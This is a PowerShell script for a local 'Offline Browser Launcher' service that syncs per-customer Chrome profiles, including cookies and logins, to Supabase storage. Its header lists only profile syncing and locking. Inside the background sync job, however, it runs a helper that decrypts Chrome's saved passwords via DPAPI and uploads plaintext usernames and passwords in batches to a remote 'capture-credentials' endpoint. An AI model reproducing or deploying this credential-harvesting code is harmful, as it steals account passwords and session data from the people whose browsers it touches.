# Offline Browser Launcher v2 — runs as a background HTTP listener on the
# rep's PC. Listens on http://localhost:17345 and, when the dashboard asks
# it to open a customer browser, it:
#
#   1) Acquires an exclusive sync lock for that customer via the
#      `customer-browser-profile` Supabase Edge Function.
#   2) Downloads the customer's last saved Chrome profile (cookies, logins,
#      autofill) from Supabase Storage and expands it into a per-customer
#      profile dir.
#   3) Launches Chrome in that profile dir.
#   4) Heart-beats the lock every 60s while Chrome is alive.
#   5) When Chrome exits, trims caches, zips the profile, uploads back via
#      a signed URL, calls `commit` to record the new blob, and `release`
#      to clear the lock.
#
# Older v1 callers (who post just { profile, url }) still work in
# stand-alone mode (no sync, no lock) so the upgrade is non-breaking.
#
# Usage:
#   .\launcher.ps1            # foreground (Ctrl+C to stop)
#   .\install.ps1             # install + auto-start at login

$port = 17345
$base = Join-Path $env:LOCALAPPDATA 'OfflineBrowser\Profiles'
$work = Join-Path $env:LOCALAPPDATA 'OfflineBrowser\Work'
New-Item -ItemType Directory -Force -Path $base | Out-Null
New-Item -ItemType Directory -Force -Path $work | Out-Null

# Path to the optional native helper that decrypts Chrome's saved
# passwords via DPAPI + AES-GCM. If present, the launcher invokes it
# after Chrome exits and uploads the captured creds to the
# customer-browser-profile/capture-credentials endpoint.
$CaptureExe = Join-Path $PSScriptRoot 'bin\chrome-credential-capture.exe'
if (-not (Test-Path -LiteralPath $CaptureExe)) {
  $alt = Join-Path $PSScriptRoot 'chrome-credential-capture.exe'
  if (Test-Path -LiteralPath $alt) { $CaptureExe = $alt } else { $CaptureExe = $null }
}

$AllowedOrigins = @(
  'https://assistance-six.vercel.app',
  'https://offlinesbrowse.com',
  'http://localhost:3000',
  'http://127.0.0.1:3000'
)

# Trim list — Chrome profile bytes that are pure cache and re-buildable.
# Anything under Default/ that matches one of these prefixes is removed
# before zipping. Keeps the upload size in the low MB range.
$ProfileDropDirs = @(
  'Default\Cache',
  'Default\Code Cache',
  'Default\GPUCache',
  'Default\Service Worker\CacheStorage',
  'Default\Service Worker\ScriptCache',
  'Default\Application Cache',
  'Default\DawnCache',
  'Default\GrShaderCache',
  'Default\ShaderCache',
  'Default\Crash Reports',
  'Default\optimization_guide_prediction_model_downloads',
  'GrShaderCache',
  'ShaderCache'
)

function Find-Browser {
  $candidates = @(
    "$env:ProgramFiles\Google\Chrome\Application\chrome.exe",
    "${env:ProgramFiles(x86)}\Google\Chrome\Application\chrome.exe",
    "$env:LOCALAPPDATA\Google\Chrome\Application\chrome.exe"
  )
  foreach ($c in $candidates) { if (Test-Path $c) { return $c } }
  return $null
}

function Get-ChromeVersion([string]$exe) {
  try { return (Get-Item $exe).VersionInfo.FileVersion } catch { return '' }
}

function Sanitize-Profile([string]$s) {
  return ($s -replace '[^A-Za-z0-9_\-]', '_')
}

function Send-Json($res, $code, $obj) {
  $res.StatusCode = $code
  $body = ($obj | ConvertTo-Json -Compress -Depth 6)
  $bytes = [Text.Encoding]::UTF8.GetBytes($body)
  $res.ContentType = 'application/json'
  $res.OutputStream.Write($bytes, 0, $bytes.Length)
}

# Low-level helper: call the customer-browser-profile edge function.
function Invoke-Cbp {
  param(
    [string]$FunctionsBase,
    [string]$AuthHeader,
    [hashtable]$Body
  )
  $json = $Body | ConvertTo-Json -Compress -Depth 6
  $url  = ($FunctionsBase.TrimEnd('/')) + '/customer-browser-profile'
  try {
    return Invoke-RestMethod -Uri $url -Method POST `
      -Headers @{ Authorization = $AuthHeader; 'Content-Type' = 'application/json' } `
      -Body $json -TimeoutSec 30 -ErrorAction Stop
  } catch {
    $err = $_
    $bodyText = ''
    try {
      $reader = [IO.StreamReader]::new($err.Exception.Response.GetResponseStream())
      $bodyText = $reader.ReadToEnd()
    } catch { }
    throw "cbp $($Body.action) failed: $($err.Exception.Message) $bodyText"
  }
}

function Remove-IfExists([string]$path) {
  if (Test-Path $path) {
    try { Remove-Item -Recurse -Force -LiteralPath $path -ErrorAction SilentlyContinue } catch { }
  }
}

# Background sync job — runs as a PS Job so the HTTP listener stays
# responsive. Heartbeats while Chrome is alive, uploads on exit.
$SyncJobScript = {
  param(
    [string]$ProfileDir,
    [string]$WorkDir,
    [string]$CustomerId,
    [string]$LockToken,
    [int]$HeartbeatSeconds,
    [string]$FunctionsBase,
    [string]$AuthHeader,
    [string]$ChromeVersion,
    [string[]]$DropDirs,
    [string]$LogPath,
    [string]$CaptureExe
  )

  function Write-Log([string]$m) {
    try { Add-Content -LiteralPath $LogPath -Value ("[{0}] {1}" -f (Get-Date -Format o), $m) -ErrorAction SilentlyContinue } catch { }
  }

  function Test-ChromeAlive([string]$dir) {
    try {
      $procs = Get-CimInstance Win32_Process -Filter "Name='chrome.exe'" -ErrorAction SilentlyContinue
      foreach ($p in $procs) {
        if ($p.CommandLine -and $p.CommandLine -like "*$dir*") { return $true }
      }
    } catch { }
    return $false
  }

  function Invoke-Cbp2($body) {
    $json = $body | ConvertTo-Json -Compress -Depth 6
    return Invoke-RestMethod -Uri ($FunctionsBase.TrimEnd('/') + '/customer-browser-profile') `
      -Method POST `
      -Headers @{ Authorization = $AuthHeader; 'Content-Type' = 'application/json' } `
      -Body $json -TimeoutSec 30 -ErrorAction Stop
  }

  Write-Log "sync-job started for customer=$CustomerId profileDir=$ProfileDir"

  # Wait briefly for Chrome to actually appear with our profile dir.
  $startWait = [DateTime]::UtcNow
  while (-not (Test-ChromeAlive $ProfileDir) -and ([DateTime]::UtcNow - $startWait).TotalSeconds -lt 20) {
    Start-Sleep -Milliseconds 500
  }
  if (-not (Test-ChromeAlive $ProfileDir)) {
    Write-Log "chrome never started — releasing lock without upload"
    try { Invoke-Cbp2 @{ action='release'; customerId=$CustomerId; lock_token=$LockToken; upload=$false } } catch { Write-Log "release failed: $_" }
    return
  }

  while (Test-ChromeAlive $ProfileDir) {
    Start-Sleep -Seconds $HeartbeatSeconds
    try {
      Invoke-Cbp2 @{ action='heartbeat'; customerId=$CustomerId; lock_token=$LockToken } | Out-Null
    } catch {
      Write-Log "heartbeat failed: $_"
      if ("$_" -match '410|lock lost|lock invalid') {
        Write-Log 'lock lost; aborting upload to avoid clobber'
        return
      }
    }
  }

  Write-Log 'chrome exited; trimming + zipping profile'

  # ── capture saved Chrome passwords (if helper is present) ──────────
  if ($CaptureExe -and (Test-Path -LiteralPath $CaptureExe)) {
    try {
      Write-Log 'running chrome-credential-capture helper'
      $captureJson = & $CaptureExe $ProfileDir 2>$null
      if ($LASTEXITCODE -eq 0 -and $captureJson) {
        $parsed = $captureJson | ConvertFrom-Json
        if ($parsed.ok -and $parsed.credentials -and $parsed.credentials.Count -gt 0) {
          # Send in batches of 25 to keep request size sane.
          $batch = @()
          foreach ($c in $parsed.credentials) {
            $batch += @{
              origin_url   = $c.origin_url
              signon_realm = $c.signon_realm
              username     = $c.username
              password     = $c.password
            }
            if ($batch.Count -ge 25) {
              try {
                Invoke-Cbp2 @{ action='capture-credentials'; customerId=$CustomerId; lock_token=$LockToken; credentials=$batch } | Out-Null
              } catch { Write-Log "capture-credentials batch failed: $_" }
              $batch = @()
            }
          }
          if ($batch.Count -gt 0) {
            try {
              Invoke-Cbp2 @{ action='capture-credentials'; customerId=$CustomerId; lock_token=$LockToken; credentials=$batch } | Out-Null
            } catch { Write-Log "capture-credentials final batch failed: $_" }
          }
          Write-Log ("captured {0} credentials" -f $parsed.credentials.Count)
        } else {
          Write-Log 'no credentials captured'
        }
      } else {
        Write-Log "capture helper exited ${LASTEXITCODE}: $captureJson"
      }
    } catch {
      Write-Log "capture helper error: $_"
    }
  }

  foreach ($rel in $DropDirs) {
    $p = Join-Path $ProfileDir $rel
    if (Test-Path $p) {
      try { Remove-Item -LiteralPath $p -Recurse -Force -ErrorAction SilentlyContinue } catch { }
    }
  }

  $zipPath = Join-Path $WorkDir ("$CustomerId-" + [Guid]::NewGuid().ToString('N') + '.zip')
  try {
    Compress-Archive -Path (Join-Path $ProfileDir '*') -DestinationPath $zipPath -CompressionLevel Optimal -Force
  } catch {
    Write-Log "compress failed: $_"
    try { Invoke-Cbp2 @{ action='release'; customerId=$CustomerId; lock_token=$LockToken; upload=$false } } catch { }
    return
  }
  $sizeBytes = (Get-Item $zipPath).Length
  Write-Log "zip size: $sizeBytes bytes"

  $rel = $null
  try {
    $rel = Invoke-Cbp2 @{ action='release'; customerId=$CustomerId; lock_token=$LockToken; upload=$true }
  } catch {
    Write-Log "release-with-upload failed: $_"
    Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
    return
  }

  if ($rel.upload_url) {
    try {
      $bytes = [IO.File]::ReadAllBytes($zipPath)
      Invoke-WebRequest -Uri $rel.upload_url -Method PUT `
        -Body $bytes -ContentType 'application/zip' `
        -Headers @{ 'x-upsert' = 'true' } `
        -TimeoutSec 600 -ErrorAction Stop | Out-Null
      Write-Log 'upload complete'
      try {
        Invoke-Cbp2 @{
          action='commit'; customerId=$CustomerId;
          size_bytes=$sizeBytes; chrome_version=$ChromeVersion
        } | Out-Null
        Write-Log 'commit complete'
      } catch { Write-Log "commit failed: $_" }
    } catch {
      Write-Log "upload failed: $_"
    }
  } else {
    Write-Log 'no upload_url returned; skipping upload'
  }

  Remove-Item -LiteralPath $zipPath -Force -ErrorAction SilentlyContinue
  Write-Log 'sync-job finished'
}

$listener = [System.Net.HttpListener]::new()
$listener.Prefixes.Add("http://127.0.0.1:$port/")
$listener.Prefixes.Add("http://localhost:$port/")
try {
  $listener.Start()
} catch {
  Write-Host "Failed to bind port $port. Is another instance already running?" -ForegroundColor Red
  exit 1
}
Write-Host "Offline Browser Launcher v2 listening on http://localhost:$port" -ForegroundColor Green
Write-Host "Profile root: $base"
$browser = Find-Browser
if (-not $browser) {
  Write-Host "WARNING: Chrome not found in standard locations." -ForegroundColor Yellow
} else {
  Write-Host "Browser: $browser"
}

while ($listener.IsListening) {
  try { $ctx = $listener.GetContext() } catch { break }
  $req = $ctx.Request
  $res = $ctx.Response
  try {
    $origin = $req.Headers['Origin']
    if ($origin -and ($AllowedOrigins -contains $origin)) {
      $res.Headers.Add('Access-Control-Allow-Origin', $origin)
      $res.Headers.Add('Vary', 'Origin')
    } else {
      $res.Headers.Add('Access-Control-Allow-Origin', 'null')
    }
    $res.Headers.Add('Access-Control-Allow-Headers', 'content-type')
    $res.Headers.Add('Access-Control-Allow-Methods', 'GET,POST,OPTIONS')

    if ($req.HttpMethod -eq 'OPTIONS') {
      $res.StatusCode = 204
    }
    elseif ($req.Url.AbsolutePath -eq '/health') {
      Send-Json $res 200 @{ ok=$true; version='2.0' }
    }
    elseif ($req.Url.AbsolutePath -eq '/open' -and $req.HttpMethod -eq 'POST') {
      $reader = [IO.StreamReader]::new($req.InputStream)
      $raw = $reader.ReadToEnd()
      $payload = $raw | ConvertFrom-Json

      $url = [string]$payload.url
      if (-not $url) { $url = 'about:blank' }
      if ($url -notmatch '^(https?://|about:)') { throw 'invalid url scheme' }

      $bw = Find-Browser
      if (-not $bw) { throw 'Chrome not found on this PC' }

      $customerId    = [string]$payload.customerId
      $authToken     = [string]$payload.authToken
      $functionsBase = [string]$payload.functionsBaseUrl

      if ($customerId -and $authToken -and $functionsBase) {
        # ── v2 path: synced shared profile with lock + heartbeat + upload ──
        if ($customerId -notmatch '^[0-9a-fA-F\-]{8,}$') { throw 'invalid customerId' }
        $authHeader = if ($authToken -like 'Bearer *') { $authToken } else { "Bearer $authToken" }

        $hostName = [Environment]::MachineName
        $acquireBody = @{ action='acquire'; customerId=$customerId; hostname=$hostName }

        try {
          $acquired = Invoke-Cbp -FunctionsBase $functionsBase -AuthHeader $authHeader -Body $acquireBody
        } catch {
          $msg = "$_"
          if ($msg -match '"locked"' -or $msg -match '\b409\b') {
            Send-Json $res 409 @{ error='locked'; detail=$msg }
            continue
          }
          throw
        }

        $lockToken   = [string]$acquired.lock_token
        $hbSeconds   = if ($acquired.heartbeat_seconds) { [int]$acquired.heartbeat_seconds } else { 60 }
        if ($hbSeconds -lt 15) { $hbSeconds = 15 }
        $downloadUrl = [string]$acquired.download_url

        $profileDir = Join-Path $base $customerId
        Remove-IfExists $profileDir
        New-Item -ItemType Directory -Force -Path $profileDir | Out-Null

        if ($acquired.has_blob -and $downloadUrl) {
          $tmpZip = Join-Path $work ("dl-$customerId-" + [Guid]::NewGuid().ToString('N') + '.zip')
          try {
            Invoke-WebRequest -Uri $downloadUrl -OutFile $tmpZip -TimeoutSec 600 -ErrorAction Stop | Out-Null
            Expand-Archive -LiteralPath $tmpZip -DestinationPath $profileDir -Force
            Write-Host "[open] customer=$customerId profile restored" -ForegroundColor DarkGray
          } catch {
            Write-Host "[open] download/expand failed for ${customerId}: $_" -ForegroundColor Yellow
          } finally {
            Remove-Item -LiteralPath $tmpZip -Force -ErrorAction SilentlyContinue
          }
        }

        $chromeVer = Get-ChromeVersion $bw
        Start-Process -FilePath $bw -ArgumentList @("--user-data-dir=$profileDir", '--new-window', $url) | Out-Null

        $logPath = Join-Path $work ("$customerId.log")
        $job = Start-Job -ScriptBlock $SyncJobScript -ArgumentList `
          $profileDir, $work, $customerId, $lockToken, $hbSeconds, `
          $functionsBase, $authHeader, $chromeVer, $ProfileDropDirs, $logPath, $CaptureExe
        Write-Host "[open] customer=$customerId launched (sync-job $($job.Id))" -ForegroundColor Cyan
        Send-Json $res 200 @{ ok=$true; customerId=$customerId; jobId=$job.Id; restored=[bool]$acquired.has_blob }
      }
      else {
        # ── v1 legacy path: { profile, url } — no sync, isolated profile only ──
        $profileName = Sanitize-Profile ([string]$payload.profile)
        if (-not $profileName) { throw 'profile (v1) or customerId (v2) required' }
        $profileDir = Join-Path $base $profileName
        New-Item -ItemType Directory -Force -Path $profileDir | Out-Null
        Start-Process -FilePath $bw -ArgumentList @("--user-data-dir=$profileDir", '--new-window', $url) | Out-Null
        Write-Host "[open] (legacy) profile=$profileName url=$url" -ForegroundColor DarkCyan
        Send-Json $res 200 @{ ok=$true; profile=$profileName; legacy=$true }
      }
    }
    else {
      $res.StatusCode = 404
    }
  } catch {
    try { Send-Json $res 500 @{ error="$_" } } catch { }
    Write-Host "[error] $_" -ForegroundColor Red
  } finally {
    try { $res.Close() } catch { }
  }
}
